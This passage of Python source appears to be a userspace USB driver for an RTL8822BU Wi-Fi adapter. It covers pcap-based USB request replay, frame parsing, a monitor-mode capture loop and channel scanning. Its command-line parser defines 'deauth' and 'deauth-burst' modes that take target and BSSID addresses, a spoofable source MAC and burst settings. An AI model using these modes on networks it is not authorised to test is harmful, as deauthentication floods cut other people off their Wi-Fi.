    def replay_all_usb_requests_from_pcap(
        self,
        pcap_path: str,
        *,
        display_filter: str,
        timeout_ms: int = 1000,
        bulk_in_default_size: int = 32768,
        sleep: bool = False,
        max_sleep_ms: int = 5,
        dry_run: bool = False,
        debug: bool = False,
        verify_in: bool = True,
        verify_in_mode: str = "bytes",
        only_rtw_vendor_req: bool = False,
        report_mismatch: int = 0,
        report_errors: int = 0,
        limit: int = 0,
    ) -> dict[str, object]:
        if self.dev is None and not bool(dry_run):
            raise RuntimeError("device not open")
        if shutil.which("tshark") is None:
            raise RuntimeError("tshark not found in PATH")
        args = [
            "tshark",
            "-r",
            pcap_path,
            "-Y",
            display_filter,
            "-T",
            "fields",
            "-E",
            "separator=\t",
            "-e",
            "frame.number",
            "-e",
            "frame.time_relative",
            "-e",
            "usb.transfer_type",
            "-e",
            "usb.urb_type",
            "-e",
            "usb.urb_id",
            "-e",
            "usb.endpoint_address",
            "-e",
            "usb.urb_len",
            "-e",
            "usb.data_len",
            "-e",
            "usb.capdata",
            "-e",
            "usb.bmRequestType",
            "-e",
            "usb.setup.bRequest",
            "-e",
            "usb.setup.wValue",
            "-e",
            "usb.setup.wIndex",
            "-e",
            "usb.setup.wLength",
            "-e",
            "usb.data_fragment",
            "-e",
            "usb.control.Response",
        ]
        proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False, text=True)
        if proc.returncode != 0:
            msg = proc.stderr.strip() or f"tshark failed with code {proc.returncode}"
            raise RuntimeError(msg)
 
        recs: list[_PcapUsbRecord] = []
        for line in proc.stdout.splitlines():
            if not line.strip():
                continue
            fields = line.split("\t")
            if len(fields) < 16:
                continue
            (
                frame_no_s,
                time_rel_s,
                transfer_type_s,
                urb_type,
                urb_id,
                ep_addr_s,
                urb_len_s,
                data_len_s,
                capdata,
                bm_req_s,
                b_req_s,
                w_value_s,
                w_index_s,
                w_len_s,
                data_fragment,
                control_response,
                *_,
            ) = fields + [""] * 4
 
            try:
                frame_no = int(frame_no_s)
            except ValueError:
                continue
            try:
                time_rel = float(time_rel_s) if time_rel_s else 0.0
            except ValueError:
                time_rel = 0.0
            try:
                transfer_type = int(transfer_type_s, 0) if transfer_type_s else -1
            except ValueError:
                transfer_type = -1
            try:
                ep_addr = int(ep_addr_s, 0) if ep_addr_s else -1
            except ValueError:
                ep_addr = -1
            try:
                urb_len = int(urb_len_s, 0) if urb_len_s else 0
            except ValueError:
                urb_len = 0
            try:
                data_len = int(data_len_s, 0) if data_len_s else 0
            except ValueError:
                data_len = 0
 
            bm_req = None
            b_req = None
            w_value = None
            w_index = None
            w_len = None
            if bm_req_s:
                try:
                    bm_req = int(bm_req_s, 0) & 0xFF
                except ValueError:
                    bm_req = None
            if b_req_s:
                try:
                    b_req = int(b_req_s, 0) & 0xFF
                except ValueError:
                    b_req = None
            if w_value_s:
                try:
                    w_value = int(w_value_s, 0) & 0xFFFF
                except ValueError:
                    w_value = None
            if w_index_s:
                try:
                    w_index = int(w_index_s, 0) & 0xFFFF
                except ValueError:
                    w_index = None
            if w_len_s:
                try:
                    w_len = int(w_len_s, 0) & 0xFFFF
                except ValueError:
                    w_len = None
 
            recs.append(
                _PcapUsbRecord(
                    frame_no=frame_no,
                    time_rel=time_rel,
                    transfer_type=transfer_type,
                    urb_type=urb_type,
                    urb_id=urb_id,
                    endpoint_address=ep_addr,
                    urb_len=urb_len,
                    data_len=data_len,
                    capdata_hex=capdata or "",
                    bm_request_type=bm_req,
                    b_request=b_req,
                    w_value=w_value,
                    w_index=w_index,
                    w_length=w_len,
                    data_fragment_hex=data_fragment or "",
                    control_response_hex=control_response or "",
                )
            )
 
        subs = [r for r in recs if r.urb_type == "'S'"]
        comps = [r for r in recs if r.urb_type == "'C'"]
        comps_by_id: dict[str, list[_PcapUsbRecord]] = {}
        for r in sorted(comps, key=lambda x: x.frame_no):
            comps_by_id.setdefault(r.urb_id, []).append(r)
        comp_pos: dict[str, int] = {k: 0 for k in comps_by_id.keys()}
 
        stats = {
            "submissions": 0,
            "control": 0,
            "bulk": 0,
            "skipped": 0,
            "errors": 0,
            "in_verified": 0,
            "in_mismatch": 0,
        }
        mismatch_frames: list[int] = []
        error_frames: list[int] = []
 
        last_t: Optional[float] = None
        for r in sorted(subs, key=lambda x: x.frame_no):
            if limit and stats["submissions"] >= limit:
                break
            if sleep:
                if last_t is not None:
                    dt_ms = (r.time_rel - last_t) * 1000.0
                    if dt_ms > 0:
                        time.sleep(min(dt_ms, float(max(0, int(max_sleep_ms)))) / 1000.0)
                last_t = r.time_rel
 
            stats["submissions"] += 1
 
            completion = None
            if r.urb_id in comps_by_id:
                i = comp_pos.get(r.urb_id, 0)
                lst = comps_by_id[r.urb_id]
                while i < len(lst) and lst[i].frame_no < r.frame_no:
                    i += 1
                if i < len(lst):
                    completion = lst[i]
                    comp_pos[r.urb_id] = i + 1
 
            try:
                if r.transfer_type == 0x02:
                    stats["control"] += 1
                    if r.bm_request_type is None or r.b_request is None:
                        stats["skipped"] += 1
                        continue
                    bm = r.bm_request_type
                    breq = r.b_request
                    wv = int(r.w_value or 0) & 0xFFFF
                    wi = int(r.w_index or 0) & 0xFFFF
                    wlen = int(r.w_length or 0)
                    if only_rtw_vendor_req and not (bm in (0x40, 0xC0) and breq == 5 and wi == 0):
                        stats["skipped"] += 1
                        continue
                    is_in = bool(bm & 0x80)
                    if dry_run:
                        continue
                    if is_in:
                        got = bytes(self.dev.ctrl_transfer(bm, breq, wv, wi, wlen, timeout=timeout_ms))
                        if verify_in and completion is not None:
                            want = b""
                            if completion.capdata_hex:
                                want = _hex_to_bytes(completion.capdata_hex)
                            elif completion.control_response_hex:
                                want = _hex_to_bytes(completion.control_response_hex)
                            if want:
                                ok = (got == want) if verify_in_mode == "bytes" else (len(got) == len(want))
                                if ok:
                                    stats["in_verified"] += 1
                                else:
                                    stats["in_mismatch"] += 1
                                    if report_mismatch and len(mismatch_frames) < int(report_mismatch):
                                        mismatch_frames.append(r.frame_no)
                    else:
                        payload_hex = r.data_fragment_hex or r.capdata_hex
                        payload = _hex_to_bytes(payload_hex) if payload_hex else b""
                        if wlen and len(payload) != wlen:
                            payload = payload[:wlen]
                        self.dev.ctrl_transfer(bm, breq, wv, wi, payload, timeout=timeout_ms)
                elif r.transfer_type == 0x03:
                    stats["bulk"] += 1
                    if r.endpoint_address < 0:
                        stats["skipped"] += 1
                        continue
                    ep = r.endpoint_address & 0xFF
                    is_in = bool(ep & 0x80)
                    if dry_run:
                        continue
                    if is_in:
                        want_len = 0
                        if completion is not None and completion.data_len:
                            want_len = int(completion.data_len)
                        if want_len <= 0 and completion is not None and completion.capdata_hex:
                            want_len = len(_hex_to_bytes(completion.capdata_hex))
                        size = int(r.urb_len or 0) or (want_len if want_len > 0 else int(bulk_in_default_size))
                        got = self.bulk_read_ep(ep, size=size, timeout_ms=timeout_ms)
                        if verify_in and completion is not None and completion.capdata_hex:
                            want = _hex_to_bytes(completion.capdata_hex)
                            if want:
                                ok = (got == want) if verify_in_mode == "bytes" else (len(got) == len(want))
                                if ok:
                                    stats["in_verified"] += 1
                                else:
                                    stats["in_mismatch"] += 1
                                    if report_mismatch and len(mismatch_frames) < int(report_mismatch):
                                        mismatch_frames.append(r.frame_no)
                    else:
                        payload_hex = r.capdata_hex or r.data_fragment_hex
                        payload = _hex_to_bytes(payload_hex) if payload_hex else b""
                        self.bulk_write_ep(ep, payload, timeout_ms=timeout_ms)
                else:
                    stats["skipped"] += 1
            except usb.core.USBError as e:
                stats["errors"] += 1
                if report_errors and len(error_frames) < int(report_errors):
                    error_frames.append(r.frame_no)
                if debug:
                    print(f"[replay] usb error frame={r.frame_no} type={r.transfer_type} urb={r.urb_id} err={e}")
 
        out: dict[str, object] = dict(stats)
        if mismatch_frames:
            out["mismatch_frames"] = mismatch_frames
        if error_frames:
            out["error_frames"] = error_frames
        return out
 
 
def parse_rx_agg(urb: bytes) -> Iterable[RxPkt]:
    if len(urb) < 24:
        return []
    out: list[RxPkt] = []
    off = 0
    remaining = len(urb)
    pkt_cnt = -1
    while remaining >= 24:
        dw0, dw1, dw2, dw3, dw4, dw5 = struct.unpack_from("<6I", urb, off)
        pkt_len = int(dw0 & 0x3FFF)
        crc_err = int((dw0 >> 14) & 1)
        icv_err = int((dw0 >> 15) & 1)
        drvinfo_sz = int(((dw0 >> 16) & 0xF) << 3)
        shift_sz = int((dw0 >> 24) & 0x3)
        physt = int((dw0 >> 26) & 1)
        c2h = int((dw2 >> 28) & 1)
        dma_agg_num = int((dw3 >> 16) & 0xFF)
        if pkt_cnt < 0 and dma_agg_num > 0:
            pkt_cnt = dma_agg_num
        tsfl = int(dw5 & 0xFFFFFFFF)
 
        pkt_offset = 24 + drvinfo_sz + shift_sz + pkt_len
        if pkt_len <= 0 or pkt_offset > remaining:
            break
        payload_start = off + 24 + drvinfo_sz + shift_sz
        payload_end = payload_start + pkt_len
        frame = urb[payload_start:payload_end]
        if not c2h:
            out.append(
                RxPkt(
                    frame=frame,
                    pkt_len=pkt_len,
                    crc_err=crc_err,
                    icv_err=icv_err,
                    physt=physt,
                    drvinfo_sz=drvinfo_sz,
                    shift_sz=shift_sz,
                    tsfl=tsfl,
                )
            )
        adv = _rnd8(pkt_offset)
        off += adv
        remaining -= adv
        if pkt_cnt > 0:
            pkt_cnt -= 1
            if pkt_cnt <= 0:
                break
    return out
 
 
def _resolve_replay_pcap(p: Optional[str]) -> Optional[str]:
    if p is None:
        return None
    ps = str(p).strip()
    if not ps:
        return None
    p0 = Path(ps)
    try:
        if p0.is_file():
            return str(p0)
    except Exception:
        pass
    try:
        if not p0.is_absolute():
            p2 = (Path(__file__).resolve().parent / p0).resolve()
            if p2.is_file():
                return str(p2)
    except Exception:
        pass
    if ("/" not in ps) and ("\\" not in ps):
        p1 = Path(__file__).resolve().parent / "firmware" / ps
        try:
            if p1.is_file():
                return str(p1)
        except Exception:
            pass
    return ps
 
 
def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(prog="rtl8822bu_pyusb")
    ap.add_argument("--vid", type=_parse_int, default=0x0BDA)
    ap.add_argument("--pid", type=_parse_int, default=0xB812)
    ap.add_argument("--bus", type=int, default=-1)
    ap.add_argument("--address", type=int, default=-1)
    ap.add_argument("--interface", type=int, default=0)
    ap.add_argument("--configuration", type=int, default=1)
    ap.add_argument("--usb-fd", type=int, default=-1)
 
    sub = ap.add_subparsers(dest="cmd", required=True)
 
    p_info = sub.add_parser("info")
 
    p_rx = sub.add_parser("rx")
    p_rx.add_argument("--channel", type=int, default=1)
    p_rx.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
    p_rx.add_argument("--ep-in", type=_parse_int, default=None)
    p_rx.add_argument("--size", type=int, default=32768)
    p_rx.add_argument("--timeout-ms", type=int, default=1000)
    p_rx.add_argument("--max-reads", type=int, default=0)
    p_rx.add_argument("--max-seconds", type=float, default=0.0)
    p_rx.add_argument("--dump-bytes", type=int, default=0)
    p_rx.add_argument("--pcap", default="")
    p_rx.add_argument("--pcap-include-bad-fcs", action="store_true")
    p_rx.add_argument("--pcap-with-fcs", action="store_true")
    p_rx.add_argument("--limit", type=int, default=0)
    p_rx.add_argument("--igi", type=_parse_int, default=-1)
    p_rx.add_argument("--debug", action="store_true")
    p_rx.add_argument("--replay-pcap", default="firmware/mon-8822bu.pcap")
    p_rx.add_argument("--replay-filter", default=None)
    p_rx.add_argument("--replay-timeout-ms", type=int, default=1000)
    p_rx.add_argument("--replay-bulk-in-default-size", type=int, default=32768)
    p_rx.add_argument("--replay-sleep", action="store_true")
    p_rx.add_argument("--replay-max-sleep-ms", type=int, default=5)
    p_rx.add_argument("--replay-limit", type=int, default=0)
    p_rx.add_argument("--replay-no-verify-in", action="store_true")
    p_rx.add_argument("--replay-verify-in-len", action="store_true")
    p_rx.add_argument("--replay-only-rtw-vendor-req", action="store_true")
    p_rx.add_argument("--replay-report-mismatch", type=int, default=0)
    p_rx.add_argument("--replay-report-errors", type=int, default=0)
    p_rx.add_argument("--replay-verify-delay-ms", type=float, default=0.0)

    p_scan = sub.add_parser("scan")
    p_scan.add_argument("--fw-path", default=None)
    p_scan.add_argument("--fw-debug", action="store_true")
    p_scan.add_argument("--fw-retries", type=int, default=3)
    p_scan.add_argument("--no-power-on", action="store_true")
    p_scan.add_argument("--channels", default="1-13,36-64,100-140,149-165")
    p_scan.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
    p_scan.add_argument("--dwell-ms", type=int, default=1000)
    p_scan.add_argument("--timeout-ms", type=int, default=1200)
    p_scan.add_argument("--ep-in", type=_parse_int, default=None)
    p_scan.add_argument("--read-size", type=int, default=32768, dest="read_size")
    p_scan.add_argument("--size", type=int, default=32768, dest="read_size")
    p_scan.add_argument("--target-ssid", default="")
    p_scan.add_argument("--forever", action="store_true")
    p_scan.add_argument("--scan-include-bad-fcs", action="store_true")
    p_scan.add_argument("--station-scan-ms", type=int, default=5000)
    p_scan.add_argument("--scan-strict-ds-channel", action="store_true")
    p_scan.add_argument("--scan-summary", action="store_true")
    p_scan.add_argument("--scan-dump", type=int, default=0)
    p_scan.add_argument("--igi", type=_parse_int, default=-1)
    p_scan.add_argument("--pcap", default="")
    p_scan.add_argument("--pcap-include-bad-fcs", action="store_true")
    p_scan.add_argument("--pcap-with-fcs", action="store_true")
    p_scan.add_argument("--replay-pcap", default="firmware/mon-8822bu.pcap")
    p_scan.add_argument("--replay-filter", default=None)
    p_scan.add_argument("--replay-mode", choices=("vendor", "all"), default="all")
    p_scan.add_argument("--replay-only", action="store_true")
    p_scan.add_argument("--replay-timeout-ms", type=int, default=1000)
    p_scan.add_argument("--replay-bulk-in-default-size", type=int, default=32768)
    p_scan.add_argument("--replay-sleep", action="store_true")
    p_scan.add_argument("--replay-max-sleep-ms", type=int, default=5)
    p_scan.add_argument("--replay-limit", type=int, default=0)
    p_scan.add_argument("--replay-no-verify-in", action="store_true")
    p_scan.add_argument("--replay-verify-in-len", action="store_true")
    p_scan.add_argument("--replay-only-rtw-vendor-req", action="store_true")
    p_scan.add_argument("--replay-report-mismatch", type=int, default=0)
    p_scan.add_argument("--replay-report-errors", type=int, default=0)
    p_scan.add_argument("--no-sitesurvey-filters", action="store_true")
    p_scan.add_argument("--debug", action="store_true")

    p_tx = sub.add_parser("tx")
    p_tx.add_argument("--ep-out", type=_parse_int, default=None)
    p_tx.add_argument("--fw-path", default=None)
    p_tx.add_argument("--fw-debug", action="store_true")
    p_tx.add_argument("--fw-retries", type=int, default=3)
    p_tx.add_argument("--no-power-on", action="store_true")
    p_tx.add_argument("--init-mac", action="store_true")
    p_tx.add_argument("--channel", type=int, default=1)
    p_tx.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
    p_tx.add_argument("--igi", type=_parse_int, default=-1)
    p_tx.add_argument("--replay-pcap", default="firmware/mon-8822bu.pcap")
    p_tx.add_argument("--replay-filter", default=None)
    p_tx.add_argument("--replay-timeout-ms", type=int, default=1000)
    p_tx.add_argument("--replay-bulk-in-default-size", type=int, default=32768)
    p_tx.add_argument("--replay-sleep", action="store_true")
    p_tx.add_argument("--replay-max-sleep-ms", type=int, default=5)
    p_tx.add_argument("--replay-no-verify-in", action="store_true")
    p_tx.add_argument("--replay-verify-in-len", action="store_true")
    p_tx.add_argument("--replay-only-rtw-vendor-req", action="store_true")
    p_tx.add_argument("--replay-report-mismatch", type=int, default=0)
    p_tx.add_argument("--replay-report-errors", type=int, default=0)
    p_tx.add_argument("--debug", action="store_true")
    p_tx.add_argument("hexframe")

    p_deauth = sub.add_parser("deauth")
    p_deauth.add_argument("--ep-out", type=_parse_int, default=None)
    p_deauth.add_argument("--fw-path", default=None)
    p_deauth.add_argument("--fw-debug", action="store_true")
    p_deauth.add_argument("--fw-retries", type=int, default=3)
    p_deauth.add_argument("--no-power-on", action="store_true")
    p_deauth.add_argument("--init-mac", action="store_true")
    p_deauth.add_argument("--channel", type=int, default=1)
    p_deauth.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
    p_deauth.add_argument("--igi", type=_parse_int, default=-1)
    p_deauth.add_argument("--replay-pcap", default="firmware/mon-8822bu.pcap")
    p_deauth.add_argument("--replay-filter", default=None)
    p_deauth.add_argument("--replay-timeout-ms", type=int, default=1000)
    p_deauth.add_argument("--replay-bulk-in-default-size", type=int, default=32768)
    p_deauth.add_argument("--replay-sleep", action="store_true")
    p_deauth.add_argument("--replay-max-sleep-ms", type=int, default=5)
    p_deauth.add_argument("--replay-no-verify-in", action="store_true")
    p_deauth.add_argument("--replay-verify-in-len", action="store_true")
    p_deauth.add_argument("--replay-only-rtw-vendor-req", action="store_true")
    p_deauth.add_argument("--replay-report-mismatch", type=int, default=0)
    p_deauth.add_argument("--replay-report-errors", type=int, default=0)
    p_deauth.add_argument("--debug", action="store_true")
    p_deauth.add_argument("--target-mac", required=True)
    p_deauth.add_argument("--bssid", required=True)
    p_deauth.add_argument("--source-mac", default=None)
    p_deauth.add_argument("--reason", type=int, default=7)
    p_deauth.add_argument("--count", type=int, default=1)
    p_deauth.add_argument("--delay-ms", type=int, default=100)

    p_deauth_burst = sub.add_parser("deauth-burst")
    p_deauth_burst.add_argument("--ep-in", type=_parse_int, default=None)
    p_deauth_burst.add_argument("--ep-out", type=_parse_int, default=None)
    p_deauth_burst.add_argument("--fw-path", default=None)
    p_deauth_burst.add_argument("--fw-debug", action="store_true")
    p_deauth_burst.add_argument("--fw-retries", type=int, default=3)
    p_deauth_burst.add_argument("--no-power-on", action="store_true")
    p_deauth_burst.add_argument("--init-mac", action="store_true")
    p_deauth_burst.add_argument("--channel", type=int, default=1)
    p_deauth_burst.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
    p_deauth_burst.add_argument("--igi", type=_parse_int, default=-1)
    p_deauth_burst.add_argument("--target-mac", required=True)
    p_deauth_burst.add_argument("--bssid", required=True)
    p_deauth_burst.add_argument("--source-mac", default=None)
    p_deauth_burst.add_argument("--reason", type=int, default=7)
    p_deauth_burst.add_argument("--pcap", required=True)
    p_deauth_burst.add_argument("--pcap-include-bad-fcs", action="store_true")
    p_deauth_burst.add_argument("--pcap-with-fcs", action="store_true")
    p_deauth_burst.add_argument("--replay-pcap", default="firmware/mon-8822bu.pcap")
    p_deauth_burst.add_argument("--replay-filter", default=None)
    p_deauth_burst.add_argument("--replay-mode", choices=("vendor", "all"), default="vendor")
    p_deauth_burst.add_argument("--replay-timeout-ms", type=int, default=1000)
    p_deauth_burst.add_argument("--replay-bulk-in-default-size", type=int, default=32768)
    p_deauth_burst.add_argument("--replay-sleep", action="store_true")
    p_deauth_burst.add_argument("--replay-max-sleep-ms", type=int, default=5)
    p_deauth_burst.add_argument("--replay-limit", type=int, default=0)
    p_deauth_burst.add_argument("--replay-no-verify-in", action="store_true")
    p_deauth_burst.add_argument("--replay-verify-in-len", action="store_true")
    p_deauth_burst.add_argument("--replay-only-rtw-vendor-req", action="store_true")
    p_deauth_burst.add_argument("--replay-report-mismatch", type=int, default=0)
    p_deauth_burst.add_argument("--replay-report-errors", type=int, default=0)
    p_deauth_burst.add_argument("--debug", action="store_true")
    p_deauth_burst.add_argument("--burst-size", type=int, default=20)
    p_deauth_burst.add_argument("--burst-interval-ms", type=int, default=2000)
    p_deauth_burst.add_argument("--burst-duration-s", type=float, default=0.0)
    p_deauth_burst.add_argument("--burst-read-timeout-ms", type=int, default=50)
    p_deauth_burst.add_argument("--read-size", type=int, default=32768, dest="read_size")
    p_deauth_burst.add_argument("--size", type=int, default=32768, dest="read_size")

    p_replay = sub.add_parser("replay")
    p_replay.add_argument("--pcap", required=True)
    p_replay.add_argument("--filter", default="usb.urb_type=='S' || usb.urb_type=='C'")
    p_replay.add_argument("--timeout-ms", type=int, default=1000)
    p_replay.add_argument("--bulk-in-default-size", type=int, default=32768)
    p_replay.add_argument("--sleep", action="store_true")
    p_replay.add_argument("--max-sleep-ms", type=int, default=5)
    p_replay.add_argument("--dry-run", action="store_true")
    p_replay.add_argument("--limit", type=int, default=0)
    p_replay.add_argument("--no-verify-in", action="store_true")
    p_replay.add_argument("--verify-in-len", action="store_true")
    p_replay.add_argument("--only-rtw-vendor-req", action="store_true")
    p_replay.add_argument("--report-mismatch", type=int, default=0)
    p_replay.add_argument("--report-errors", type=int, default=0)
    p_replay.add_argument("--debug", action="store_true")
 
    args, extra = ap.parse_known_args(argv)
    if extra:
        if (
            len(extra) == 1
            and extra[0] == argv[-1]
            and re.fullmatch(r"[0-9]+", extra[0]) is not None
            and int(getattr(args, "usb_fd", -1)) < 0
        ):
            usb_fd_auto = int(extra[0], 10)
            args = ap.parse_args(argv[:-1])
            args.usb_fd = usb_fd_auto
        else:
            ap.error("unrecognized arguments: " + " ".join(extra))

    if int(getattr(args, "usb_fd", -1)) < 0:
        env_fd = os.environ.get("TERMUX_USB_FD") or os.environ.get("RTWMON_TERMUX_USB_FD")
        if env_fd is not None and re.fullmatch(r"[0-9]+", str(env_fd).strip() or "") is not None:
            args.usb_fd = int(str(env_fd).strip(), 10)

    if args.cmd == "scan" and _is_termux() and not bool(getattr(args, "target_ssid", "")) and not bool(getattr(args, "forever", False)):
        args.forever = True
 
    dev = Rtl8822buUsb(vid=args.vid, pid=args.pid)
    if args.cmd != "replay" or not bool(getattr(args, "dry_run", False)):
        usb_fd = int(getattr(args, "usb_fd", -1))
        bus = int(getattr(args, "bus", -1))
        addr = int(getattr(args, "address", -1))
        dev.open(
            interface=args.interface,
            configuration=args.configuration,
            usb_fd=(usb_fd if usb_fd >= 0 else None),
            bus=(bus if bus >= 0 else None),
            address=(addr if addr >= 0 else None),
        )
 
    try:
        if args.cmd == "replay":
            replay_pcap = _resolve_replay_pcap(getattr(args, "pcap", None))
            if replay_pcap is None:
                raise RuntimeError("missing --pcap")
            stats = dev.replay_all_usb_requests_from_pcap(
                replay_pcap,
                display_filter=str(getattr(args, "filter", "usb.urb_type=='S' || usb.urb_type=='C'")),
                timeout_ms=int(getattr(args, "timeout_ms", 1000)),
                bulk_in_default_size=int(getattr(args, "bulk_in_default_size", 32768)),
                sleep=bool(getattr(args, "sleep", False)),
                max_sleep_ms=int(getattr(args, "max_sleep_ms", 5)),
                dry_run=bool(getattr(args, "dry_run", False)),
                debug=bool(getattr(args, "debug", False)),
                verify_in=not bool(getattr(args, "no_verify_in", False)),
                verify_in_mode=("len" if bool(getattr(args, "verify_in_len", False)) else "bytes"),
                only_rtw_vendor_req=bool(getattr(args, "only_rtw_vendor_req", False)),
                report_mismatch=int(getattr(args, "report_mismatch", 0)),
                report_errors=int(getattr(args, "report_errors", 0)),
                limit=int(getattr(args, "limit", 0)),
            )
            print(stats)
            return 0

        if args.cmd == "info":
            print(f"Device: {int(args.vid):04x}:{int(args.pid):04x}")
            bus_s = int(getattr(dev.dev, "bus", -1) or -1) if dev.dev is not None else -1
            addr_s = int(getattr(dev.dev, "address", -1) or -1) if dev.dev is not None else -1
            print(f"Location: bus={bus_s} address={addr_s}")
            print(f"Interface: {int(args.interface)} alt={int(dev.altsetting)}")
            print("Bulk IN endpoints:", ", ".join(f"0x{e.bEndpointAddress:02x}" for e in dev.bulk_in_eps))
            print("Bulk OUT endpoints:", ", ".join(f"0x{e.bEndpointAddress:02x}" for e in dev.bulk_out_eps))
            return 0
 
        if args.cmd == "rx":
            replay_pcap = _resolve_replay_pcap(getattr(args, "replay_pcap", None))
            if replay_pcap is None:
                raise RuntimeError("missing --replay-pcap")
 
            default_filter = "usb.urb_type=='S' || usb.urb_type=='C'"
            if str(getattr(args, "replay_mode", "all")) == "vendor":
                default_filter = "usb.urb_type=='S' || usb.urb_type=='C'"
            display_filter = str(getattr(args, "replay_filter", None) or default_filter)
            stats = dev.replay_all_usb_requests_from_pcap(
                replay_pcap,
                display_filter=display_filter,
                timeout_ms=int(args.replay_timeout_ms),
                bulk_in_default_size=int(args.replay_bulk_in_default_size),
                sleep=bool(args.replay_sleep),
                max_sleep_ms=int(args.replay_max_sleep_ms),
                dry_run=False,
                debug=bool(args.debug),
                verify_in=not bool(args.replay_no_verify_in),
                verify_in_mode=("len" if bool(args.replay_verify_in_len) else "bytes"),
                only_rtw_vendor_req=bool(args.replay_only_rtw_vendor_req) or (str(getattr(args, "replay_mode", "all")) == "vendor"),
                report_mismatch=int(args.replay_report_mismatch),
                report_errors=int(args.replay_report_errors),
                limit=int(args.replay_limit),
            )
            if args.debug:
                print(f"[replay] stats={stats}")
            if bool(getattr(args, "replay_only", False)):
                return 0

            dev.set_channel(int(args.channel), bandwidth_mhz=int(args.bw))
            if int(getattr(args, "igi", -1)) >= 0:
                dev.set_igi(int(args.igi))
                if args.debug:
                    igi_a, igi_b = dev.get_igi()
                    sys.stderr.write(f"[rx] igi a={igi_a} b={igi_b}\n")
 
            ep_in = args.ep_in
            if ep_in is None:
                ep_in = int(dev.bulk_in_eps[0].bEndpointAddress)
 
            seen = 0
            reads = 0
            t0 = time.monotonic()
            pcap = None
            fp = None
            try:
                if str(getattr(args, "pcap", "")).strip():
                    p = str(args.pcap).strip()
                    fp = sys.stdout.buffer if p == "-" else open(p, "wb")
                    pcap = PcapWriter(fp)
                while True:
                    raw = dev.bulk_read_ep(int(ep_in), size=int(args.size), timeout_ms=int(args.timeout_ms))
                    reads += 1
                    if args.max_reads and reads >= int(args.max_reads):
                        return 1 if seen == 0 else 0
                    if args.max_seconds and (time.monotonic() - t0) >= float(args.max_seconds):
                        return 1 if seen == 0 else 0
                    if not raw:
                        continue
                    for pkt in parse_rx_agg(raw):
                        frame = pkt.frame
                        if _fc_version(frame) != 0:
                            continue
                        fc = int.from_bytes(frame[0:2], "little") if len(frame) >= 2 else 0
                        a1, a2, a3, _a4, ftype, subtype, seq, dur = _parse_addrs_any(frame)
                        seq_num = (seq >> 4) & 0xFFF
                        frag_num = seq & 0xF
                        kind = _fc_type_subtype_name(ftype, subtype)
                        print(
                            f"rx len={pkt.pkt_len} crc={pkt.crc_err} icv={pkt.icv_err} shift={pkt.shift_sz} drvinfo={pkt.drvinfo_sz} "
                            f"kind={kind} fc=0x{fc:04x} dur=0x{dur:04x} "
                            f"a1={_fmt_mac(a1)} a2={_fmt_mac(a2)} a3={_fmt_mac(a3)} seq={seq_num} frag={frag_num}"
                        )
                        if int(args.dump_bytes) > 0:
                            dump = frame[: min(len(frame), int(args.dump_bytes))]
                            print(dump.hex())
                        sys.stdout.flush()

                        if pcap is not None:
                            if not bool(args.pcap_include_bad_fcs) and (pkt.crc_err or pkt.icv_err):
                                continue
                            if len(frame) < 2 or len(frame) > 4096:
                                continue
                            out_frame = frame
                            has_fcs = False
                            if not (pkt.crc_err or pkt.icv_err):
                                stripped, has_fcs = _strip_fcs_if_present(frame)
                                if not bool(args.pcap_with_fcs):
                                    out_frame = stripped

                            flags: Optional[int] = None
                            if bool(args.pcap_with_fcs):
                                flags_val = 0x10 if has_fcs else 0
                                if pkt.crc_err:
                                    flags_val |= 0x40
                                flags = flags_val

                            tsft = int(time.time() * 1_000_000)
                            rtap = _radiotap_header(tsft=tsft, channel=int(dev.current_channel), flags=flags)
                            pcap.write_packet(rtap + out_frame)

                        seen += 1
                        if int(args.limit) > 0 and seen >= int(args.limit):
                            return 0
            finally:
                if pcap is not None:
                    pcap.flush()
                if fp is not None and fp is not sys.stdout.buffer:
                    fp.close()

        if args.cmd == "scan":
            replay_pcap = _resolve_replay_pcap(getattr(args, "replay_pcap", None))
            if replay_pcap is None:
                raise RuntimeError("missing --replay-pcap")

            default_filter = "usb.urb_type=='S' || usb.urb_type=='C'"
            display_filter = str(getattr(args, "replay_filter", None) or default_filter)
            stats = dev.replay_all_usb_requests_from_pcap(
                replay_pcap,
                display_filter=display_filter,
                timeout_ms=int(args.replay_timeout_ms),
                bulk_in_default_size=int(args.replay_bulk_in_default_size),
                sleep=bool(args.replay_sleep),
                max_sleep_ms=int(args.replay_max_sleep_ms),
                dry_run=False,
                debug=bool(args.debug),
                verify_in=not bool(args.replay_no_verify_in),
                verify_in_mode=("len" if bool(args.replay_verify_in_len) else "bytes"),
                only_rtw_vendor_req=bool(args.replay_only_rtw_vendor_req),
                report_mismatch=int(args.replay_report_mismatch),
                report_errors=int(args.replay_report_errors),
                limit=int(args.replay_limit),
            )
            if args.debug:
                print(f"[replay] stats={stats}")

            channels = _parse_channels(str(args.channels))
            if not channels:
                raise RuntimeError("no valid --channels")

            ep_in = args.ep_in
            if ep_in is None:
                ep_in = int(dev.bulk_in_eps[0].bEndpointAddress)

            target_ssid = str(getattr(args, "target_ssid", "")).strip()
            include_bad = bool(args.scan_include_bad_fcs) or int(getattr(args, "usb_fd", -1)) >= 0
            if not target_ssid:
                args.forever = True

            def _best_channel(counts: object) -> int:
                if not isinstance(counts, dict) or not counts:
                    return 0
                best_k = 0
                best_v = -1
                for k, v in counts.items():
                    try:
                        kk = int(k)
                        vv = int(v)
                    except Exception:
                        continue
                    if vv > best_v:
                        best_v = vv
                        best_k = kk
                return best_k

            results: Dict[str, Dict[str, object]] = {}
            per_ch: Dict[int, Dict[str, int]] = {}
            stations_by_bssid: Dict[str, Dict[str, int]] = {}

            pcap = None
            fp = None
            try:
                if str(getattr(args, "pcap", "")).strip():
                    p = str(args.pcap).strip()
                    fp = sys.stdout.buffer if p == "-" else open(p, "wb")
                    pcap = PcapWriter(fp)

                scan_iter = itertools.cycle(channels) if bool(args.forever) else channels

                for ch in scan_iter:
                    dev.set_channel(int(ch), bandwidth_mhz=int(args.bw))
                    if int(getattr(args, "igi", -1)) >= 0:
                        dev.set_igi(int(args.igi))
                    if args.debug:
                        rf18 = dev._rf_serial_read(0, RF_CHNLBW_JAGUAR)
                        sys.stderr.write(f"[scan] set_channel ch={int(ch)} rf18=0x{rf18:05x}\n")
